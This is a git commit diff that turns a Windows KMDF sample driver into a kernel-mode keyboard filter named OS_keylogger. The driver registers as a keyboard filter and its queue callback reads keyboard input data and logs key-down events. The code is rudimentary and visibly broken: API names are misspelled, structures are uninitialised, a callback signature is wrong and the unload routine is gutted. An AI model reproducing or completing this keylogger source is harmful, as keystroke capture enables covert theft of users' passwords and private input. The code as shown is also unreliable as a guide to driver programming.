68c8c44c1d58b8d59eae55b312554b7cc66550cb
Nikodem Czachorowski <czachorowski123@gmail.com>
2025-11-21 01:02:29 +0100

    random bullshit go

--- OS_keylogger/Driver.c
+++ OS_keylogger/Driver.c
@@ -1,8 +1,10 @@
 #include <ntddk.h>
 #include <wdf.h>
 
+#include<ntddkbd.h>
+
 DRIVER_INITIALIZE DriverEntry;
-EVT_WDF_DRIVER_DEVICE_ADD KmdfHelloWorldEvtDeviceAdd;
+EVT_WDF_DRIVER_DEVICE_ADD OS_keyloggerEvtDeviceAdd;
 DRIVER_UNLOAD DriverUnload;
 
 NTSTATUS
@@ -18,12 +20,12 @@ DriverEntry(
     WDF_DRIVER_CONFIG config;
 
     // Print "Hello World" for DriverEntry
-    DbgPrint("KmdfHelloWorld: DriverEntry\n");
+    DbgPrint("OS_keylogger: DriverEntry\n");
 
     // Initialize the driver configuration object to register the
     // entry point for the EvtDeviceAdd callback, KmdfHelloWorldEvtDeviceAdd
     WDF_DRIVER_CONFIG_INIT(&config,
-        KmdfHelloWorldEvtDeviceAdd
+        OS_keyloggerEvtDeviceAdd
     );
 
     DriverObject->DriverUnload = DriverUnload;
@@ -39,7 +41,7 @@ DriverEntry(
 }
 
 NTSTATUS
-KmdfHelloWorldEvtDeviceAdd(
+OS_keyloggerEvtDeviceAdd(
     _In_    WDFDRIVER       Driver,
     _Inout_ PWDFDEVICE_INIT DeviceInit
 )
@@ -49,26 +51,57 @@ KmdfHelloWorldEvtDeviceAdd(
     UNREFERENCED_PARAMETER(Driver);
 
     NTSTATUS status;
-
-    // Allocate the device object
-    WDFDEVICE hDevice;
+    WDF_OBJECT_ATTRIBUTES wdfObjectAttr;
+    WDFDEVICE wdfDevice;
 
     // Print "Hello World"
-    DbgPrint("KmdfHelloWorld: KmdfHelloWorldEvtDeviceAdd\n");
+    DbgPrint("OS_keylogger: OS_keyloggerEvtDeviceAdd\n");
+
+    wdfFdoInitSetFilter(DeviceInit);
+
+    wdfDeviceSerDeviceType(DeviceInit, FILE_DEVICE_KEYBOARD);
 
     // Create the device object
     status = WdfDeviceCreate(&DeviceInit,
-        WDF_NO_OBJECT_ATTRIBUTES,
-        &hDevice
+        &wdfObjectAttr,
+        &wdfDevice
     );
-    return status;
+
+    if (!NT_SUCCESS(status)) {
+        DbgPrint(("OS_keylogger: WdfDeviceCreate failed 0x%x\n", status));
+        return status;
+    }
+
+    WDF_IO_QUEUE_CONFIG queueConfig;
+
+    queueConfig.EvtIoInternalDeviceControl = OS_keyloggerRead;
+
+    status = WdfIoQueueCreate(wdfDevice,
+        &queueConfig,
+        WDF_NO_OBJECT_ATTRIBUTES,
+        WDF_NO_HANDLE
+    );
+
+    if (!NT_SUCCESS(status)) {
+        DbgPrint(("OS_keylogger: WdfIoQueueCreate failed 0x%x\n", status));
+        return status;
+    }
+
+    return STATUS_SUCCESS;
 }
 
 VOID
-DriverUnload(
-    _In_ PDRIVER_OBJECT DriverObject
-)
+OS_keyloggerRead(
+    _In_ WDFQUEUE queue,
+    _In_ WDFREQUEST request,
+    _In_ size_t size
+) 
 {
-    UNREFERENCED_PARAMETER(DriverObject);
-    DbgPrint("OS_keylogger: DriverUnload\n"); 
+    PKEYBOARD_INPUT_DATA input;
+    WdfRequestRetrieveInputBuffer(request, sizeof(KEYBOARD_INPUT_DATA), input, NULL);
+
+    if (input->Flags == 0) {
+        DbgPrint("OS_keylogger: key down");
+    }
+    WdfRequestComplete(request, STATUS_SUCCESS);
 }
